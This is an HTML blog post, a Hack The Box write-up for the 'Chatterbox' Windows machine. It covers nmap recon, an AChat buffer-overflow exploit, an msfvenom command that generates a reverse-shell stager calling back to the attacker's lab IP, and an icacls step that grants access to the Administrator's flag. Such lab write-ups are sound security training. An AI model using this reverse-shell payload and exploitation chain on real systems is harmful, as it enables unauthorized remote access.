@@ -1,0 +1,324 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Chatterbox - Hack The Box</title>
+  <meta name="description" content="Resolution of the Chatterbox machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Chatterbox - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/chatterbox">
+  <meta property="og:description" content="Resolution of the Chatterbox machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/chatterbox">
+  <meta name="twitter:title" content="Chatterbox - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Chatterbox machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/chatterbox/chatterbox-00-2f55b655f960c33410e4755f15d3d56db2e6751a46248cd8e5f7060d8e74992b.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/chatterbox/chatterbox-00-2f55b655f960c33410e4755f15d3d56db2e6751a46248cd8e5f7060d8e74992b.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Chatterbox - Hack The Box</h1>
+            <p>Resolution of the Chatterbox machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    July 2, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      3 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/chatterbox/chatterbox-00-2f55b655f960c33410e4755f15d3d56db2e6751a46248cd8e5f7060d8e74992b.png">
+  <img src="/assets/hackthebox/chatterbox/chatterbox-00-2f55b655f960c33410e4755f15d3d56db2e6751a46248cd8e5f7060d8e74992b.png" alt="Chatterbox banner" class="zooming" data-rjs="/assets/hackthebox/chatterbox/chatterbox-00-2f55b655f960c33410e4755f15d3d56db2e6751a46248cd8e5f7060d8e74992b.png" data-zooming-width="534" data-zooming-height="340" />
+</a></p>
+
+<p>Chatterbox is a medium level machine based on Windows, the initial approach is based on a vulnerability for the service named <code class="highlighter-rouge">Achat</code>, it requires <code class="highlighter-rouge">exploit modification/adaptation</code> skills.
+The machine is unstable, the privilege escalation process is pretty easy, doesn’t requiring any exploit.</p>
+
+<h1 id="recon">Recon</h1>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Sun May 10 00:36:09 2020 as: nmap -sC -sV -T5 --min-parallelism=50 -n --min-rate=300 -oA chatterbox -p- 10.10.10.74</span>
+Nmap scan report <span class="k">for </span>10.10.10.74
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE VERSION
+9255/tcp open  http    AChat chat system httpd
+|_http-server-header: AChat
+|_http-title: Site doesnt have a title.
+9256/tcp open  achat   AChat chat system
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun May 10 00:39:06 2020 -- 1 IP address (1 host up) scanned in 177.60 seconds</span></code></pre></figure>
+
+<p>The port <code class="highlighter-rouge">9256</code> is open, searching on Google for any service running in this port, we found that there’s a service named <code class="highlighter-rouge">Achat</code>.
+After another search for any suitable exploits for this service, we found an interesting one:</p>
+
+<p><a href="https://www.exploit-db.com/exploits/36025" target="_blank">Achat 0.150 beta7 - Remote Buffer Overflow</a></p>
+
+<p>The above script exploits a Achat vulnerability that results in a <code class="highlighter-rouge">buffer overflow</code>.</p>
+
+<h1 id="exploiting---analyzing-and-modifying-exploits">Exploiting - Analyzing and modifying exploits</h1>
+
+<p>After a code review, we noticed that this exploit trigger a buffer overflow on Achat, but this exploit is just a <code class="highlighter-rouge">PoC</code>, it just open a calculator on the victim’s machine. There’s a comment in the exploit code saying that we need to generate a custom payload stager in order to work properly.</p>
+
+<p>We’re going to do a simple exploit modification by generating a new stager to achieve a reverse shell connection using <code class="highlighter-rouge">msfvenom</code>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">msfvenom <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.34 <span class="nv">LPORT</span><span class="o">=</span>4445 <span class="nv">BufferRegister</span><span class="o">=</span>EAX <span class="nt">-e</span> x86/unicode_mixed <span class="nt">--arch</span> x86 <span class="nt">--platform</span> windows <span class="nt">-b</span> <span class="s1">'\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'</span> <span class="nt">-f</span> python</code></pre></figure>
+
+<p>Basically, a payload stager is generated to be injected during the buffer overflow process, allowing us to establish a reverse shell conection.
+The above payload is compatible with a netcat on listening mode because it uses the payload <code class="highlighter-rouge">shell_reverse_tcp</code>.</p>
+
+<p>The tuple’s content named <code class="highlighter-rouge">server_address</code> will be modified by replacing with the IP of the machine, <code class="highlighter-rouge">10.10.10.74</code>:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="s">'10.10.10.74'</span><span class="p">,</span> <span class="mi">9256</span><span class="p">)</span></code></pre></figure>
+
+<p>After that, we run the script with a netcat on listening mode:</p>
+
+<p><a href="/assets/hackthebox/chatterbox/chatterbox-01-c3d17d855d778d31f25b79ecba6f1d42e89028b5562f85abcc91768c97d403d6.png">
+  <img src="/assets/hackthebox/chatterbox/chatterbox-01-c3d17d855d778d31f25b79ecba6f1d42e89028b5562f85abcc91768c97d403d6.png" alt="Chatterbox Exploit" class="zooming" data-rjs="/assets/hackthebox/chatterbox/chatterbox-01-c3d17d855d778d31f25b79ecba6f1d42e89028b5562f85abcc91768c97d403d6.png" data-zooming-width="1158" data-zooming-height="130" />
+</a></p>
+
+<p>Now we’re able to capture the first flag!</p>
+
+<p><a href="/assets/hackthebox/chatterbox/chatterbox-02-28ae3523a159e5a4253863dd72a629184e20d524c7ce68722d56fa5d28f42cd9.png">
+  <img src="/assets/hackthebox/chatterbox/chatterbox-02-28ae3523a159e5a4253863dd72a629184e20d524c7ce68722d56fa5d28f42cd9.png" alt="Chatterbox Exploit" class="zooming" data-rjs="/assets/hackthebox/chatterbox/chatterbox-02-28ae3523a159e5a4253863dd72a629184e20d524c7ce68722d56fa5d28f42cd9.png" data-zooming-width="437" data-zooming-height="109" />
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that trigger a buffer overflow, generate/send a custom payload stager and spawn an interactive shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/chatterbox" target="_blank">Chatterbox Exploit</a></p>
+
+<p><a href="/assets/hackthebox/chatterbox/chatterbox-03-cb9a16a69f0174a54ee9fb024eb0593db85641e29f121c41db233330d8e426c5.png">
+  <img src="/assets/hackthebox/chatterbox/chatterbox-03-cb9a16a69f0174a54ee9fb024eb0593db85641e29f121c41db233330d8e426c5.png" alt="Chatterbox Exploit" class="zooming" data-rjs="/assets/hackthebox/chatterbox/chatterbox-03-cb9a16a69f0174a54ee9fb024eb0593db85641e29f121c41db233330d8e426c5.png" data-zooming-width="640" data-zooming-height="251" />
+</a></p>
+
+<h1 id="post-exploitation---abusing-read-permissions">Post Exploitation - Abusing read permissions</h1>
+
+<p>In the process of privilege escalation, we noticed that we have access to the Administrator’s folder, something uncommon for our current user, because normally we don’t have access to this folder.
+We can use <code class="highlighter-rouge">icacls</code> to grant read access to the flag file as a Administrator:</p>
+
+<figure class="highlight"><pre><code class="language-bat" data-lang="bat"><span class="nb">icacls</span> <span class="kd">root</span>.txt <span class="na">/grant </span><span class="kd">Alfred</span>:<span class="o">(</span><span class="kd">F</span><span class="o">)</span></code></pre></figure>
+
+<p>We successfully got the root.txt content!</p>
+
+<p><a href="/assets/hackthebox/chatterbox/chatterbox-04-761445de515532c20836888519de8708a68b7d734a9bd69d487da02b9bd1dad9.png">
+  <img src="/assets/hackthebox/chatterbox/chatterbox-04-761445de515532c20836888519de8708a68b7d734a9bd69d487da02b9bd1dad9.png" alt="Chatterbox Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/chatterbox/chatterbox-04-761445de515532c20836888519de8708a68b7d734a9bd69d487da02b9bd1dad9.png" data-zooming-width="481" data-zooming-height="141" />
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Chatterbox+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/chatterbox%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/chatterbox" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
